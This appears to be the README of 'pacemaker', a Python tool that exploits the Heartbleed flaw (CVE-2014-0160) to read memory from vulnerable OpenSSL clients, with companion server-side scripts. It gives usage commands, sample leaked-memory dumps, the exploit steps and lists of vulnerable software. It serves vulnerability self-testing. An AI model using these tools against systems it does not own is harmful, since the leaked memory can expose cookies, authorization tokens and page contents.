# Pacemaker
Attempts to abuse OpenSSL *clients* that are vulnerable to [Heartbleed][0]
([CVE-2014-0160][1]). Compatible with Python 2 and 3.

## Am I vulnerable?
Run the server:

    python pacemaker.py

In your client, open https://localhost:4433/ (replace the hostname if needed).
For example:

    curl https://localhost:4433/

The client will always fail to connect:

    curl: (35) Unknown SSL protocol error in connection to localhost:4433

If you are not vulnerable, the server outputs something like:

    Connection from: 127.0.0.1:40736
    Possibly not vulnerable

If you *are* vulnerable, you will see something like:

    Connection from: 127.0.0.1:40738
    Client returned 65535 (0xffff) bytes
    0000: 18 03 03 40 00 02 ff ff 2d 03 03 52 34 c6 6d 86  ...@....-..R4.m.
    0010: 8d e8 40 97 da ee 7e 21 c4 1d 2e 9f e9 60 5f 05  ..@...~!.....`_.
    0020: b0 ce af 7e b7 95 8c 33 42 3f d5 00 c0 30 00 00  ...~...3B?...0..
    0030: 05 00 0f 00 01 01 00 00 00 00 00 00 00 00 00 00  ................
    0040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    *
    4000: 00 00 00 00 00 18 03 03 40 00 00 00 00 00 00 00  ........@.......
    8000: 00 00 00 00 00 00 00 00 00 00 18 03 03 40 00 00  .............@..
    ...
    e440: 1d 2e 9f e9 60 5f 05 b0 ce af 7e b7 95 8c 33 42  ....`_....~...3B
    e450: 3f d5 00 c0 30 00 00 05 00 0f 00 01 01 00 00 00  ?...0...........
    fff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00     ...............


Subsequent lines full of NUL bytes are folded into one with an `*` thereafter
(like the `xxd` tool).

An example where more "interesting" memory gets leaked using
`wget -O /dev/null https://google.com https://localhost:4433`:

    Connection from: 127.0.0.1:41914
    Client returned 65535 (0xffff) bytes
    0000: 18 03 03 40 00 02 ff ff 2d 03 03 52 34 c6 6d 86  ...@....-..R4.m.
    0010: 8d e8 40 97 da ee 7e 21 c4 1d 2e 9f e9 60 5f 05  ..@...~!.....`_.
    0020: b0 ce af 7e b7 95 8c 33 42 3f d5 00 c0 30 00 00  ...~...3B?...0..
    0030: 05 00 0f 00 01 01 65 0d 0a 43 6f 6e 74 65 6e 74  ......e..Content
    0040: 2d 54 79 70 65 3a 20 74 65 78 74 2f 68 74 6d 6c  -Type: text/html
    0050: 3b 20 63 68 61 72 73 65 74 3d 55 54 46 2d 38 0d  ; charset=UTF-8.
    ...
    0b50: 01 05 05 07 02 01 16 2d 68 74 74 70 73 3a 2f 2f  .......-https://
    0b60: 77 77 77 2e 67 65 6f 74 72 75 73 74 2e 63 6f 6d  www.geotrust.com
    0b70: 2f 72 65 73 6f 75 72 63 65 73 2f 72 65 70 6f 73  /resources/repos
    0b80: 69 74 6f 72 79 30 0d 06 09 2a 86 48 86 f7 0d 01  itory0...*.H....
    0b90: 01 05 05 00 03 81 81 00 76 e1 12 6e 4e 4b 16 12  ........v..nNK..
    0ba0: 86 30 06 b2 81 08 cf f0 08 c7 c7 71 7e 66 ee c2  .0.........q~f..
    0bb0: ed d4 3b 1f ff f0 f0 c8 4e d6 43 38 b0 b9 30 7d  ..;.....N.C8..0}
    0bc0: 18 d0 55 83 a2 6a cb 36 11 9c e8 48 66 a3 6d 7f  ..U..j.6...Hf.m.
    0bd0: b8 13 d4 47 fe 8b 5a 5c 73 fc ae d9 1b 32 19 38  ...G..Z\s....2.8
    0be0: ab 97 34 14 aa 96 d2 eb a3 1c 14 08 49 b6 bb e5  ..4.........I...
    0bf0: 91 ef 83 36 eb 1d 56 6f ca da bc 73 63 90 e4 7f  ...6..Vo...sc...
    0c00: 7b 3e 22 cb 3d 07 ed 5f 38 74 9c e3 03 50 4e a1  {>".=.._8t...PN.
    0c10: af 98 ee 61 f2 84 3f 12 00 00 00 00 00 00 00 00  ...a..?.........
    0c20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    *
    4000: 00 00 00 00 00 18 03 03 40 00 00 00 00 00 00 00  ........@.......
    ...
    ffd0: 00 00 00 00 5c d3 3c 02 00 00 00 00 49 53 4f 36  ....\.<.....ISO6
    ffe0: 34 36 2d 53 45 2f 2f 00 53 45 4e 5f 38 35 30 32  46-SE//.SEN_8502
    fff0: 30 30 5f 42 2f 2f 00 00 00 00 00 00 00 00 00     00_B//.........

## How does it work?
[TLS heartbeats][2] can be sent by either side of a TLS connection. After the
handshake completes, these heartbeats are encrypted. But apparently OpenSSL
allows heartbeat messages before the handshake is completed. These heartbeats
(on top of the record layer) are not encrypted at all!

This makes it very easy to exploit the bug on clients:

 1. Wait for a ClientHello containing a TLS version and cipher suite.
 2. Send a ServerHello containing the same TLS version and cipher suite (to
    prevent handshake failure).
 3. At this point, the server can send as many heartbeat requests as it likes.

Note that there is *no* need for any certificates as the heartbeats are accepted
before any certificate or encryption keys are exchanged. As the length of the
heartbeat requests are unchecked, [up to 64 kiB][3] memory can be read from
client memory.

pacemaker performs the above steps and assumes a client not to be vulnerable if
step 3 results in data other than Alerts. If needed for some protocols (SMTP
with STARTTLS for example), additional data is exchanged before the TLS
handshake starts.

## Advanced usage
Run `./pacemaker.py -h` for more options. The most important options are
probably `-t` (`--timeout`) and `-x` (`--count`). The default timeout is 3
seconds which should be enough for most clients to respond (unless there is a
satellite link or something).

Example to be more patient per heartbeat (5 seconds) and acquire four heartbeat
responses:

    ./pacemaker.py -t 5 -x 4

In theory, the heartbeats can take twenty seconds now, but in practice you will
get responses much faster.

## Tested clients
The following clients have been tested against OpenSSL 1.0.1f on Arch Linux and
leaked memory before the handshake:

 - MariaDB 5.5.36
 - wget 1.15 (leaks memory of earlier connections and own state)
 - curl 7.36.0 (https, FTP/IMAP/POP3/SMTP with --ftp-ssl)
 - git 1.9.1 (tested clone / push, leaks not much)
 - nginx 1.4.7 (in proxy mode, leaks memory of previous requests)
 - links 2.8 (leaks contents of previous visits!)
 - KDE 4.12.4 (kioclient, Dolphin, tested https and ftps with kde4-ftps-kio)
 - Exim 4.82 (outgoing SMTP)

links is a great example that demonstrates the effect of this bug on clients. It
is a text-based browser that leaks details including headers (cookies,
authorization tokens) and page contents.

## License
pacemaker is licensed under the MIT license. See the LICENSE file for more
details.

# heartbleed.py
This is an implementation that uses pacemaker for crafting packets.
It has the caveat that repeated requests need to establish a new connection for
every attempt because the server immediately resets the connection after the
first heartbeat response.

The caveat is a limitation resulting from the taken approach, if the handshake
would be completed by the client too, then many encrypted handshakes can be sent
without connection failures.

heartbleed.py is part of pacemaker, so falls under the same license terms.

## Tested servers
The following servers have been tested against OpenSSL 1.0.1f on Arch Linux
(unless stated otherwise):

 - `openssl s_server` (HTTPS)
 - nginx 1.4.7 (HTTPS)
 - Dovecot 2.2.11 (IMAP / POP3)
 - proftpd 1.3.4a-5+deb7u1 (explicit FTP)
 - Exim 4.82 (SMTP)

# ssltest.py
This repository also contains a working version that targets servers. ssltest.py
was created by Jared Stafford (<jspenguin@jspenguin.org>), all due credits are
to him! It was retrieved from http://s3.jspenguin.org/ssltest.py.

At the moment, the script is only compatible with Python 2.

  [0]: http://heartbleed.com/
  [1]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
  [2]: https://tools.ietf.org/html/rfc6520#section-3
  [3]: http://blog.existentialize.com/diagnosis-of-the-openssl-heartbleed-bug.html
